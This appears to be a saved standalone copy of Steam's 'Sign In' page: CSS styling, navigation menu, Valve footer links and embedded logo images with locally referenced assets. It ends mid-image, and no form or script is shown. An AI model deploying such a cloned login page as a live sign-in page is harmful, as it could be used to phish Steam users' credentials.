<!DOCTYPE html>
<html class=responsive lang=en>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=theme-color content=#171a21>
<title>Sign In</title>
<meta name=twitter:card content=summary_large_image>
<meta name=twitter:site content=@steam>
<meta property=og:title content="Sign In">
<meta property=twitter:title content="Sign In">
<meta property=og:type content=website>
<meta property=fb:app_id content=105386699540688>
<meta property=og:site content=Steam>
<link rel=image_src href=https://store.akamai.steamstatic.com/public/shared/images/responsive/share_steam_logo.png>
<meta property=og:image
    content=https://store.akamai.steamstatic.com/public/shared/images/responsive/share_steam_logo.png>
<meta name=twitter:image
    content=https://store.akamai.steamstatic.com/public/shared/images/responsive/share_steam_logo.png>
<meta property=og:image:secure
    content=https://store.akamai.steamstatic.com/public/shared/images/responsive/share_steam_logo.png>
<link rel="shortcut icon" href="favicon.ico" type=image/x-icon>
<link rel=canonical href="https://store.steampowered.com/login/?redir=&amp;redir_ssl=1&amp;snr=1_4_661__global-header">
<meta http-equiv=content-security-policy
    content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:;">
<style>
    :root {
        --gpSystemLightestGrey: #dcdedf;
        --gpSystemLighterGrey: #b8bcbf;
        --gpSystemLightGrey: #8b929a;
        --gpSystemGrey: #67707b;
        --gpSystemDarkGrey: #3d4450;
        --gpSystemDarkerGrey: #23262e;
        --gpSystemDarkestGrey: #0e141b;
        --gpStoreLightestGrey: #ccd8e3;
        --gpStoreLighterGrey: #a7bacc;
        --gpStoreLightGrey: #7c8ea3;
        --gpStoreGrey: #4e697d;
        --gpStoreDarkGrey: #2a475e;
        --gpStoreDarkerGrey: #1b2838;
        --gpStoreDarkestGrey: #000f18;
        --gpGradient-StoreBackground: linear-gradient(180deg, var(--gpStoreDarkGrey) 0, var(--gpStoreDarkerGrey) 80%);
        --gpGradient-LibraryBackground: radial-gradient(farthest-corner at 40px 40px, #3d4450 0, #23262e 80%);
        --gpColor-Blue: #1a9fff;
        --gpColor-BlueHi: #0bf;
        --gpColor-Green: #5ba32b;
        --gpColor-GreenHi: #59bf40;
        --gpColor-Orange: #e35e1c;
        --gpColor-Red: #d94126;
        --gpColor-RedHi: #ee563b;
        --gpColor-DustyBlue: #417a9b;
        --gpColor-LightBlue: #b3dfff;
        --gpColor-Yellow: #ffc82c;
        --gpColor-ChalkyBlue: #66c0f4;
        --gpBackground-LightSofter: #6998bb24;
        --gpBackground-LightSoft: #3b5a7280;
        --gpBackground-LightMedium: #678BA670;
        --gpBackground-LightHard: #93B8D480;
        --gpBackground-LightHarder: #aacce6a6;
        --gpBackground-DarkSofter: #0e141b33;
        --gpBackground-DarkSoft: #0e141b66;
        --gpBackground-DarkMedium: #0e141b99;
        --gpBackground-DarkHard: #0e141bcc;
        --gpBackground-Neutral-LightSofter: rgba(235, 246, 255, 0.10);
        --gpBackground-Neutral-LightSoft: rgba(235, 246, 255, 0.20);
        --gpBackground-Neutral-LightMedium: rgba(235, 246, 255, 0.30);
        --gpBackground-Neutral-LightHard: rgba(235, 246, 255, 0.40);
        --gpBackground-Neutral-LightHarder: rgba(235, 246, 255, 0.50);
        --gpCorner-Small: 1px;
        --gpCorner-Medium: 2px;
        --gpCorner-Large: 3px;
        --gpSpace-Gutter: 24px;
        --gpSpace-Gap: 12px;
        --gpNavWidth: 240px;
        --gpPaymentsNavWidth: 340px;
        --gpDselectWidth: 340px;
        --gpSidePanelWidth: 340px;
        --gpGiftingPanelWidth: 280px;
        --gpCommunityRightPanelWidth: 320px;
        --gpVerticalResponsivePadding-Small: calc((100vw - 854px)/60);
        --gpVerticalResponsivePadding-Medium: calc((100vw - 854px)/20);
        --gpVerticalResponsivePadding-Large: calc((100vw - 854px)/12);
        --screen-width: 100vw;
        --gpWidth-6colcap: calc((var(--screen-width) -(5*var(--gpSpace-Gap)) -(2*var(--gpSpace-Gutter)))/6);
        --gpWidth-5colcap: calc((var(--screen-width) -(4*var(--gpSpace-Gap)) -(2*var(--gpSpace-Gutter)))/5);
        --gpWidth-4colcap: calc((var(--screen-width) -(3*var(--gpSpace-Gap)) -(2*var(--gpSpace-Gutter)))/4);
        --gpWidth-3colcap: calc((var(--screen-width) -(2*var(--gpSpace-Gap)) -(2*var(--gpSpace-Gutter)))/3);
        --gpWidth-2colcap: calc((var(--screen-width) -(1*var(--gpSpace-Gap)) -(2*var(--gpSpace-Gutter)))/2);
        --gpWidth-1colcap: calc((var(--screen-width) -(2*var(--gpSpace-Gutter))));
        --gpStoreMenuHeight: 58px;
        --gpShadow-Small: 0 2px 2px 0 #0000003D;
        --gpShadow-Medium: 0 3px 6px 0 #0000003D;
        --gpShadow-Large: 0 12px 16px 0 #0000003D;
        --gpShadow-XLarge: 0 24px 32px 0 #0000003D;
        --gpText-HeadingLarge: normal 700 26px/1.4"Motiva Sans", Arial, Sans-serif;
        --gpText-HeadingMedium: normal 700 22px/1.4"Motiva Sans", Arial, Sans-serif;
        --gpText-HeadingSmall: normal 700 18px/1.4"Motiva Sans", Arial, Sans-serif;
        --gpText-BodyLarge: normal 400 16px/1.4"Motiva Sans", Arial, Sans-serif;
        --gpText-BodyMedium: normal 400 14px/1.4"Motiva Sans", Arial, Sans-serif;
        --gpText-BodySmall: normal 400 12px/1.4"Motiva Sans", Arial, Sans-serif
    }

    @media screen and (min-width:1280px) {
        :root {
            --gpSpace-Gutter: calc(24px+2vw)
        }
    }

    .btnv6_white_transparent {
        border-radius: 2px;
        border: 0;
        padding: 1px;
        cursor: pointer;
        text-decoration: none !important;
        color: #fff !important;
        background: transparent
    }

    .btnv6_white_transparent>span {
        display: block;
        background: transparent;
        border: 1px solid rgba(255, 255, 255, 0.4);
        border-radius: 2px
    }

    .btnv6_white_transparent:not(.btn_disabled):not(:disabled):not(.btn_active):not(.active):hover {
        text-decoration: none !important;
        color: #fff !important;
        background: transparent
    }

    .btnv6_white_transparent:not(.btn_disabled):not(:disabled):not(.btn_active):not(.active):hover>span {
        background: transparent;
        border: 1px solid rgba(255, 255, 255, 1);
        border-radius: 2px
    }

    .btn_medium>span {
        padding: 0 15px;
        font-size: 15px;
        line-height: 30px
    }

    button:disabled {
        opacity: .45;
        cursor: default
    }

    button:disabled:hover {
        text-decoration: none
    }

    * {
        padding: 0;
        margin: 0
    }

    img {
        border: 0
    }

    a {
        text-decoration: none;
        color: #fff
    }

    a:hover {
        text-decoration: none;
        color: #66c0f4
    }

    body.v6 {
        font-size: 12px
    }

    body.v6 .page_content {
        margin: 0 auto
    }

    .nonresponsive_hidden {
        display: none
    }

    @media screen and (max-width:910px) {
        html.responsive body.v6 .page_content {
            max-width: 940px;
            width: auto;
            margin: 0 2%
        }
    }

    @media screen and (max-width:910px) {

        html.responsive #responsive_store_search_overlay,
        html.responsive #responsive_store_nav_overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            height: 100vh;
            background-color: #000000AA;
            z-index: 101;
            flex-direction: column
        }
    }

    body.v6 {
        background: #1b2838
    }

    body.login {
        color: #e9e9e9;
        background-color: #181a21;
        font-family: "Motiva Sans", Sans-serif;
        font-weight: normal
    }

    body.login .page_content {
        padding: 0 8px;
        width: 100%
    }

    body.login.global .page_content {
        background: radial-gradient(rgba(24, 26, 33, 0) 0, #181a21 100%) fixed no-repeat, url(1.jpg)center top no-repeat, #181a21
    }

    .login .subtext {
        font-size: 14px;
        color: #b8b6b4
    }

    .login .login_join_desc {
        max-width: 60%;
        text-align: center;
        font-size: 14px
    }

    .about_link {
        margin-top: 10px;
        color: #fff
    }

    .join_image {
        width: 320px
    }

    .login_btn_ctn {
        margin-top: 20px
    }

    .login_btn_ctn a {
        margin: 20px 0 10px 0;
        display: block;
        text-align: center
    }

    .login_bottom_row {
        display: flex;
        flex-direction: row;
        padding-top: 48px;
        align-items: center;
        margin-right: auto;
        margin-left: auto;
        width: 100%;
        justify-content: center;
        background-color: #181a21
    }

    .login_bottom_row_item {
        flex: 1;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        text-align: center;
        max-width: 200px
    }

    @media screen and (max-width:910px) {
        html.responsive {
            flex-wrap: wrap;
            justify-content: center
        }

        html.responsive body.v6 .page_content {
            padding: 0;
            width: 100%;
            margin: 0 auto
        }
    }

    @media screen and (max-width:700px) {
        html.responsive .login_bottom_row {
            flex-direction: column-reverse
        }

        html.responsive body.login.global .page_content {
            background: radial-gradient(rgba(24, 26, 33, 0) 0, #181a21 100%) fixed no-repeat, url(2.jpg)center top no-repeat, #181a21
        }
    }

    .responsive_page_frame {
        position: relative
    }

    html.responsive {
        height: 100%
    }

    html.responsive body {
        min-height: 100%;
        height: auto;
        position: relative
    }

    .responsive_page_menu_ctn {
        position: fixed;
        top: 0;
        bottom: 0;
        overflow: hidden;
        background: black;
        z-index: 30;
        width: 280px
    }

    .responsive_page_frame:not(.in_menu_drag) .responsive_page_menu_ctn {
        transition: left .5s, right .5s
    }

    .responsive_page_menu_ctn.mainmenu {
        left: -280px
    }

    .responsive_page_menu_ctn.localmenu {
        right: -280px
    }

    .responsive_page_content_overlay {
        visibility: hidden;
        opacity: 0;
        background: rgba(0, 0, 0, 0.4);
        position: fixed;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        z-index: 25;
        transition: visibility .5s, opacity .5s
    }

    .responsive_page_menu {
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        overflow: hidden;
        overflow-y: auto;
        -webkit-overflow-scrolling: touch
    }

    .mainmenu_contents {
        background: #171a21;
        font-size: 22px;
        position: relative;
        min-height: 100%
    }

    .mainmenu_contents_items {
        font-family: "Motiva Sans", Sans-serif;
        font-weight: 200
    }

    .responsive_page_menu_ctn.localmenu .responsive_page_menu {
        background: #171a21
    }

    .mainmenu_contents .menuitem {
        display: block;
        padding: 0 12px;
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
        line-height: 2.5em;
        text-decoration: none;
        cursor: pointer
    }

    .mainmenu_contents .menuitem {
        position: relative;
        color: #bdbdbd;
        background: #171a21;
        transition: background .25s, color .25s
    }

    .mainmenu_contents .menuitem,
    .mainmenu .minor_menu_items {
        border-top: 1px solid #2f3138;
        border-bottom: 1px solid #000
    }

    .mainmenu .minor_menu_items {
        border-bottom: 0
    }

    .mainmenu .minor_menu_items .menuitem {
        color: #8a8a8a;
        border: 0;
        font-size: .75em
    }

    .mainmenu_footer_spacer {
        height: 160px
    }

    .mainmenu_footer {
        position: absolute;
        left: 0;
        right: 0;
        bottom: 0;
        font-size: 10px;
        white-space: normal;
        color: #8a8a8a;
        padding: 0 12px 24px 12px
    }

    .mainmenu_footer .mainmenu_valve_links>a {
        color: #8a8a8a
    }

    .responsive_header {
        display: none;
        background: #171a21;
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        text-align: center;
        z-index: 20;
        box-shadow: 0 0 7px 0 rgba(0, 0, 0, 0.75);
        overflow: hidden;
        padding: 13px 8px
    }

    @media screen and (max-height:360px) {
        .responsive_header {
            position: absolute
        }
    }

    #responsive_menu_logo {
        position: absolute;
        top: 9px;
        cursor: pointer;
        width: 36px;
        height: 31px
    }

    #responsive_menu_logo {
        left: 8px
    }

    .responsive_header .responsive_header_logo img {
        vertical-align: middle
    }

    .responsive_header .responsive_header_logo a {
        display: inline-block
    }

    .localmenu_content {
        padding: 16px
    }

    .mainmenu_footer a:hover {
        color: #fff
    }

    @media screen and (max-width:910px) {
        html.responsive div.responsive_header {
            display: block
        }

        html.responsive div.responsive_page_content {
            position: relative;
            z-index: 10
        }

        html.responsive .responsive_page_frame.with_header div.responsive_page_content {
            padding-top: 62px
        }

        html.responsive .responsive_page_template_content {
            padding-bottom: 120px;
            min-height: calc(100vh - 120px)
        }

        html.responsive div.nonresponsive_hidden {
            display: block
        }
    }

    .responsive_fixonscroll_ctn {
        position: fixed;
        left: 0;
        right: 0;
        background: #171a21;
        box-shadow: 0 2px 4px 0#000;
        z-index: 15
    }

    .newlogindialog_Login_ZOBYq {
        position: relative
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_SideBySide_1Wl13 {
        display: flex;
        flex-direction: row;
        flex: 1;
        padding-top: 10px
    }

    @media screen and (max-width:700px) {
        .newlogindialog_Login_ZOBYq .newlogindialog_SideBySide_1Wl13 {
            flex-direction: column
        }
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_QRSection_2ZDyS {
        flex: 0;
        display: grid;
        gap: 4px;
        margin-left: 40px
    }

    @media screen and (max-width:700px) {
        .newlogindialog_Login_ZOBYq .newlogindialog_QRSection_2ZDyS {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-left: 0;
            margin-top: 48px
        }
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_QRSection_2ZDyS .newlogindialog_MessagingContainer_3ph6w {
        display: flex;
        flex-direction: column;
        align-items: flex-start;
        width: 200px
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_QRSection_2ZDyS .newlogindialog_MessagingTag_3jy5R {
        color: #1999ff;
        font-weight: 500;
        font-size: 12px;
        line-height: 16px;
        margin: 6px 0;
        text-transform: uppercase;
        letter-spacing: .02em
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_QRSection_2ZDyS .newlogindialog_MessagingSubtitle_toeax {
        font-weight: 400;
        font-size: 12px;
        line-height: 16px;
        color: #afafaf;
        margin: 8px
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_QRSection_2ZDyS .newlogindialog_MessagingButton_-jjqv {
        background-color: rgba(255, 255, 255, .1);
        border-radius: 2px;
        font-weight: 700;
        font-size: 12px;
        line-height: 20px;
        text-align: center;
        color: #fff;
        padding: 8px 16px
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_QRSection_2ZDyS .newlogindialog_MessagingLink_1ozce {
        text-align: center;
        text-decoration-line: underline;
        font-weight: 400;
        font-size: 12px;
        line-height: 24px;
        color: #afafaf;
        padding: 12px 0;
        cursor: pointer
    }

    @media screen and (max-width:700px) {
        .newlogindialog_Login_ZOBYq .newlogindialog_QRSection_2ZDyS .newlogindialog_MessagingContainer_3ph6w {
            align-items: center
        }

        .newlogindialog_Login_ZOBYq .newlogindialog_QRSection_2ZDyS .newlogindialog_MessagingSubtitle_toeax {
            text-align: center
        }
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_TextField_2KXGK {
        display: grid;
        grid-template-areas: "label hint" "input input";
        grid-template-columns: 1fr min-content;
        gap: 2px
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_TextInput_2eKVn {
        border-radius: 2px;
        color: #fff;
        padding: 10px;
        background-color: #32353c;
        outline: 0;
        font-size: 15px;
        grid-area: input;
        border: 1px solid #32353c
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_TextInput_2eKVn:hover {
        background-color: #393c44
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_LoginForm_3Tsg9 {
        flex: 1;
        display: grid;
        gap: 12px;
        grid-template-columns: 1fr
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_FieldLabel_3d8dp {
        font-size: 12px;
        color: #afafaf;
        text-transform: uppercase;
        letter-spacing: .02em;
        user-select: none
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_FieldLabel_3d8dp.newlogindialog_Highlight_XyqzE {
        color: #1999ff;
        font-weight: 500
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_CheckboxField_2QWD5 {
        display: flex;
        flex-direction: row;
        align-items: center;
        cursor: pointer
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_CheckboxField_2QWD5 .newlogindialog_CheckboxFieldLabel_2yrCY {
        color: #afafaf;
        font-size: 12px;
        user-select: none;
        padding-left: 6px
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_Checkbox_3tTFg {
        width: 14px;
        height: 14px;
        padding: 3px;
        border-radius: 2px;
        background-color: #32353c;
        cursor: pointer
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_Checkbox_3tTFg .newlogindialog_Check_6EoZE {
        width: 100%;
        height: 100%;
        display: flex
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_Checkbox_3tTFg:hover {
        background-color: #393c44
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_Checkbox_3tTFg:focus {
        outline: 1px #06bfff solid
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_CheckboxField_2QWD5:hover .newlogindialog_Checkbox_3tTFg {
        background-color: #393c44
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_SignInButtonContainer_14fsn {
        display: flex;
        flex-direction: column;
        align-items: center
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_SignInButtonContainer_14fsn button {
        width: 270px
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_SubmitButton_2QgFE {
        position: relative;
        background: linear-gradient(90deg, #06bfff 0, #2d73ff 100%);
        border-radius: 2px;
        border: 0;
        outline: 0;
        padding: 12px;
        color: #fff;
        font-size: 18px;
        font-weight: 500;
        font-family: inherit;
        text-align: center;
        letter-spacing: .03em;
        cursor: pointer
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_SubmitButton_2QgFE:hover {
        background: linear-gradient(90deg, #06bfff 30%, #2d73ff 100%)
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_SubmitButton_2QgFE:active {
        background: linear-gradient(90deg, #06bfff 50%, #2d73ff 100%)
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_SubmitButton_2QgFE:disabled {
        opacity: .5
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_SubmitButton_2QgFE:focus {
        outline: solid #06bfff;
        outline-width: 1px
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_TextLink_1cnUQ {
        color: #afafaf;
        font-size: 12px;
        text-decoration: underline;
        cursor: pointer
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_TextLink_1cnUQ:hover {
        color: #c9c9c9
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_FormError_1Mcy9 {
        color: #c15755;
        font-size: 12px;
        font-weight: 500;
        text-align: center
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_TextAlignCenter_2meUB {
        text-align: center
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_FlexCol_1mhmm {
        display: flex;
        flex-direction: column
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_StandardLayout_286eh:not(.IN_CLIENT) {
        width: 100%
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_StandardLayout_286eh .newlogindialog_PrimaryHeader_39uMK {
        color: #fff;
        font-size: 32px;
        text-transform: uppercase;
        letter-spacing: .055em;
        font-weight: 200
    }

    @media screen and (max-width:700px) {
        .newlogindialog_Login_ZOBYq .newlogindialog_StandardLayout_286eh .newlogindialog_PrimaryHeader_39uMK {
            text-align: center
        }
    }

    .newlogindialog_Login_ZOBYq .newlogindialog_StandardLayout_286eh .newlogindialog_FormContainer_3jLIH {
        background-color: #181a21;
        border-radius: 4px;
        padding: 24px 32px;
        flex: 1;
        min-width: 636px
    }

    @media screen and (max-width:700px) {
        .newlogindialog_Login_ZOBYq .newlogindialog_StandardLayout_286eh .newlogindialog_FormContainer_3jLIH {
            min-width: 0;
            background-color: transparent
        }
    }

    .login_LoginContainer_2kLRm {
        padding-top: 80px;
        padding-bottom: 150px;
        display: flex;
        flex-direction: column;
        align-items: center
    }

    @media screen and (max-width:700px) {
        .login_LoginContainer_2kLRm {
            padding-top: 12px;
            padding-bottom: 0
        }
    }

    .sf-hidden {
        display: none !important
    }
</style>
</head>

<body class="login v6 global responsive_page">
    <div class="responsive_page_frame with_header">
        <div class="responsive_page_menu_ctn mainmenu">
            <div class=responsive_page_menu id=responsive_page_menu>
                <div class=mainmenu_contents>
                    <div class=mainmenu_contents_items>
                        <a class=menuitem
                            href="https://store.steampowered.com/login/?redir=login%2F%3Fredir%3D%26redir_ssl%3D1%26snr%3D1_4_661__global-header&amp;redir_ssl=1&amp;snr=1_60_4__global-header">
                            Login </a>
                        <a class="menuitem supernav"
                            href="https://store.steampowered.com/?snr=1_60_4__global-responsive-menu"
                            data-tooltip-type=selector data-tooltip-content=.submenu_store>
                            Store </a>
                        <div class=submenu_store style=display:none data-submenuid=store>
                        </div>
                        <a class="menuitem supernav" style=display:block href=https://steamcommunity.com/
                            data-tooltip-type=selector data-tooltip-content=.submenu_community>
                            Community </a>
                        <div class=submenu_community style=display:none data-submenuid=community>
                        </div>
                        <a class=menuitem href=https://help.steampowered.com/en />
                        Support </a>
                        <div class=minor_menu_items>
                            <div class="menuitem change_language_action">
                                Change language </div>
                            <div class=menuitem>
                                View desktop website </div>
                        </div>
                    </div>
                    <div class=mainmenu_footer_spacer></div>
                    <div class=mainmenu_footer>
                        <div class=mainmenu_footer_logo><img
                                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFwAAAAaCAYAAAA67jspAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAxBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6Q0EyOTgwRUExQ0U5MTFFNDgwMDFCNUU4OERGRTJGQzgiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6Q0EyOTgwRTkxQ0U5MTFFNDgwMDFCNUU4OERGRTJGQzgiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiBXaW5kb3dzIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9IjAyMkFDMTE4RDc5NzJBQTMwQURERjgyRTQ5NjgyMDc1IiBzdFJlZjpkb2N1bWVudElEPSIwMjJBQzExOEQ3OTcyQUEzMEFEREY4MkU0OTY4MjA3NSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PrOZC/4AAAO8SURBVHja7FhbSBVRFJ2rNwMt7WEJRQ8wqSiwIgqT8pHJLQ0KetJHSUHkTwl99BFR0YfQj19FUVC/vSitMHvdKHpAkJkWFKHUhxJZ9rCszNvauAd2h5k7Zy4z14hZsJztOTPnnlmzzz57n9D91vYWwzAyjQB+YgNYAfaH8WcymBVo4ivGg52kdVg0fgTfBNp4holgNtstrO1VEjyDG+vBLYFO7lAwa6pl+4O2jjpcdor7mumaAoYD2ZIHJ7GngKfZbgerLO45Bk5nez8YjTPeNPCE0rYK7NGc7x4wwvZe8J7GM2fBcWxX8XtIrAd3sH0FPGwxRi540saTK+G9X70SnOJOHjgBXAzuAj+J/nR+iWHgAPjMYbxKsEhpKwfPaM53hng+W/MZEmMN28vA40r/WjHmUZsxRlrMW1fDv5Di0B/jr27eW6z0L2KxDfa2bofxllu0rXAx3xEJrOJLwl6q9IWEkL/ARo3xloBzBb94Kbi5mZooUfrkB2hwGCdD3B8VKyXCL+7FirRCE9jHdqnyW/lipUSV1WsHWsXNJhFOfnst+E3wu42HFNt4khXo2TS2r4G32M5hT/EL38AbIgzlJzh/E5f54xAPuZ2MjuAk9nW2Z4sNiOL3ArZfgK9chJMoi55IWEkEcpWW2gherzlWIYehItbDc8HNr6pOWMZvHe+o4Gsv+FgRPOKz4A28H8n5pwrBKTy81RxrJYfWEs6UfBFcTtiM42Uu4jd5wiSxufaDHWJVFIBjfRS8C3wkvDrMYSzLZTgx52+GlFa/BO9ir5RCm97xDnzoIpzQi49i3hHzKE9SWKHNe2GC8ZtwBDxlEnl4uh+CSy/O5Xx4vmgf0AwnhH18bkPc5pAyegk1PTRXKoWSJw7PysO9jeBmwTQvK03VQw6KijJVc7PJ5I3GCRF2gAGfBH8OvmaHodU0x8Vm2Qautunr9Uvwp1x50nHuOosMxg5l4nconNQq/bV8NEDZzzwRuvwKKzWKA+gI/h686ObwyqtCgrKValE8NIkcPV45b+K8xcQLxVlMhQvBt1pUvgZXi41xwkqN+P+zw9lP0g+vrDyk2oV3hJSU77ZNJbhb5OMHNOdSadPeE0dwyjA+gGPEx/n5LwtO3tDJRU9Myc+tkMexvpszHavN6S5nOsP5/tG8odrFS6fyuy9OH5Xh54zBE0LCBSPJcCv4D2Pw5FAXL7l0dxIoR3O8TR6883bmkCDFCDBkHk7nInWBJO6Awseuq8hJ8JnMAEFI+X8QisVigQpJxB8BBgBdZchSLVr8xgAAAABJRU5ErkJggg==">
                        </div>
                        © Valve Corporation. All rights reserved. All trademarks are property of their respective owners
                        in the US and other countries. <span class=mainmenu_valve_links>
                            <a href="https://store.steampowered.com/privacy_agreement/?snr=1_60_4__global-responsive-menu"
                                target=_blank>Privacy Policy</a>
                            &nbsp;| &nbsp;<a href=http://www.valvesoftware.com/legal.htm target=_blank>Legal</a>
                            &nbsp;| &nbsp;<a
                                href="https://store.steampowered.com/subscriber_agreement/?snr=1_60_4__global-responsive-menu"
                                target=_blank>Steam Subscriber Agreement</a>
                            &nbsp;| &nbsp;<a
                                href="https://store.steampowered.com/steam_refunds/?snr=1_60_4__global-responsive-menu"
                                target=_blank>Refunds</a>
                        </span>
                    </div>
                </div>
            </div>
        </div>

        <div class="responsive_local_menu_tab sf-hidden"></div>
        <div class="responsive_page_menu_ctn localmenu">
            <div class=responsive_page_menu id=responsive_page_local_menu
                data-panel='{"onOptionsActionDescription":"Filter","onOptionsButton":"Responsive_ToggleLocalMenu()","onCancelButton":"Responsive_ToggleLocalMenu()"}'>
                <div class=localmenu_content
                    data-panel='{"maintainY":true,"bFocusRingRoot":true,"flow-children":"column"}'>
                </div>
            </div>
        </div>
        <div class=responsive_header>
            <div class=responsive_header_content>
                <div id=responsive_menu_logo>
                    <img src=data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPQAAADUCAYAAACrgw7IAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAADmNJREFUeNrs3V9MVGcax/F3/mnQkboQC4qLrstWbWuCNli765+GprVpu7JG24uKe+mu7cVettleNE160ZuaNm1smrRuYiBdErGA1ohlu2ETxe3adqf+KaygBWEFRQYpAyMDwz7vMNAzZwZLd3c4L5PvJ3kCZ4aLyfD8zvuec2be4xofH1cAMoObtwAg0AAINAACDYBAAwQaAIEGQKABEGgABBog0AAINAACDYBAAyDQAIEGQKABEGgABBog0AAINAACDYBAAyDQAIEGQKABEGgABBoAgQYyj9fpF1BeXs5/AXNWRUUFgZ7kcrnUnj17ZvKnS6QKpdZJzaONkEYjUueluqS6Z9LDdk7eotlr8BubJbVPaqfUNvoMDmiSOiL1ntQwx9D/veelLku9RZjhoEek3pS6IrWXQP94Hql3pCqlCugnGCJf6rDUQdMP+Uybch+Oj85JCgtXqIKC5crr9dJeSJvR0VHV1dWpOjuvqWg0an96v5o4n/Msgf5hL6cK8693/EZt3bpNZWffQ7dh1nz33XeqsfGv6pPjdfZg75Z6TepVAj29ovibNGXVqp+rPeW/VcuX/5TuwqxbtGiReuaZHWrD+odUZeVh1dp62fr0K1JVUpc4hk7tdeuxSU5Ortq3bz9hhuOWFRSo3/3+RZWXn2992COj9gETX68Jgc6JT2Om6D3jT3Jy6CYYITs7Wz311DOJwXG7t/f39z9IoJPpMHusU+1fbd5CF8Eomzb9Um3cuCnhsaysrF3W3iXQExKuM6+XYxbARGvWrE3Y9nq9JfJjAYFOVGTd+MV999E5MJK+dGqbduuPI/tMGqVNCHSWdWPePD6qDTPJFDvp8Dr+00eggTnG7UmKy+TI7CXQQOZgyg1kEBeBBkCgARBogEADINAACDRgNr34gU2EQCfrs26EBgfpHBhJL3pgNT4+3kugk7VYN1rbWukcGKmtNbE3o9FoK4FO1mjd+PzvZ1Ot5QQ47ty5zxPn25HI6cnBmkB/r05qap59/fq/1SefHKN7YJT6kydUe/u31ofCbW1tJwl0Mh3mt60PHD9Wq86ePUMXwQi6F48ePWIfnQ8FAoFgfHOMQCd6Q9lOjv3p0AexvSLgpM8+a4j1ok2wpaXFuqbYqCmv15SvfQ2Oj48/53K56pXlmyt6r3j58r/UhodKVElJifL5+K400k9fnvryy3Pq3D8+V4HAP+1Pjw0MDLxgGZ31dHvElNfucvLGWvab1ckb+aLX6313ur/3eDyxxfaBdNHncGQ6Pe3z4XD4perqauuQHZYasv4NN6uLq6qqOlhWVtbr9/s/lM2FSbvGsTHV0dFO18EJ4VAotL+mpqbOml1l2E3sjPqkmIzW47W1tUc7Ojq2SHiP0EMwgfTix11dXZttYY4dKiqDznAbN+WeVFlZOV+P0KWlpUW5ubk7ZRr+mNvtLqG1MFui0WhADgFPBYPBuoaGhlR3yBiS3g1LryY94WimTAx0PNR64TW/sqwGkZeXN6+4uHgt7YZ0aW5ubmlvbw/f5U90